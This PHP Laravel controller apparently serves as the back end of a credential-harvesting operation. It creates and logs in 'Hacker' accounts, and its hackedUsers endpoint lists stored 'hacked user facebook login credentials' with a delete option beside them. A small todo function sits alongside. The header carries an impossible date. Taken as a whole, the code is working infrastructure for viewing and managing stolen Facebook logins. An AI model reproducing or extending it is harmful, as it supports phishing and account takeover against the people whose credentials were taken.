<?php

/**
 * Dated : 22/21/2021
 *
 * This is a Developer Controller: in use: serves as reference code for future projects
 * 
 * @author   Silas Udofia <Silas@Verixon.com>
 */

namespace App\Http\Controllers\API;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\User;
use App\Todo;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Laravel\Passport\RefreshToken;
use Laravel\Passport\Token;
use App\Http\Requests\DevSignUpRequest;
use App\Http\Requests\devLoginRequest;
use DB;
use App\HackedUser;
use App\Http\Resources\HackedUserResource;

class DevController extends Controller
{
    
    public function devSignUp(DevSignUpRequest $request){

      try{
       
        $name = $request->input('name');
        $email = $request->input('email');
        $password = $request->input('password');
      

        $DevUserCredentials = [
            'name'=> $name,
            'email' => $email,
            'password' =>  Hash::make($password)
        ];

        $DevUser = User::create($DevUserCredentials);

        $response = [
            'notify' => 'Your Hacker account has been created',
            'token' => $DevUser->createToken('HACKER')->accessToken
        ];

      return response()->json($response, 200);
     } catch(\Exception $exception){
        return response()->json(['message'=> $exception->getMessage()],400);
     }

    }
    
    
    public function devLogin(devLoginRequest $request){

     try{
            $email = $request->input('email');
            $password = $request->input('password');

            $DevUserCredentials = [
                'email' => $email,
                'password' => $password
            ];

            if(Auth::Attempt($DevUserCredentials)){

                $DevUser = Auth::User();

                $response = [
                    'notify' => 'You are in',
                    'token' =>$DevUser->createToken('HACKER')->accessToken
                ];

              return response()->json($response, 200);
            }

            return response()->json(['message'=>'Unauthorised Access'], 400);

        } catch(\Exception $exception){
            return response()->json(['message'=> $exception->getMessage()],400);
        }    
    }

    public function logOutDev(){

        $user = Auth::user();
        $tokens = $user->tokens->pluck('id');

        Token::whereIn('id', $tokens)->update(['revoked'=> true]);
        RefreshToken::whereIn('access_token_id', $tokens)->update(['revoked' => true]);

        DB::table('oauth_access_tokens')->where('user_id', $user->id)->delete();

        $response = [
            'notification' => 'You are out !',
        ];

        return Response()->json($response, 200);
    }

    public function hackedUsers(){

        $hackedUsers =  HackedUser::orderBy('created_at', 'desc')->paginate(5);

        $response = [
            'notify' => 'Here are the hacked user facebook login credentials',
            'data' => HackedUserResource::collection($hackedUsers)
        ];

        return response()->json($response,200);

    }

    public function deleteUser($id){
        
        $hackedUser = HackedUser::find($id);
        $hackedUser->delete();

        return response()->json(['message'=> 'User deleted'], 200);
    }

    public function addTodo(Request $request)
    {
        $title = $request->input('title');

        $todo = Todo::create(['title' => $title]);

        return response()->json([

            'message' => 'Todo has been added',
            'title' => $todo->title
        
        ],200);
    }

    //we need to paginate the data fetched from db , point to note
}
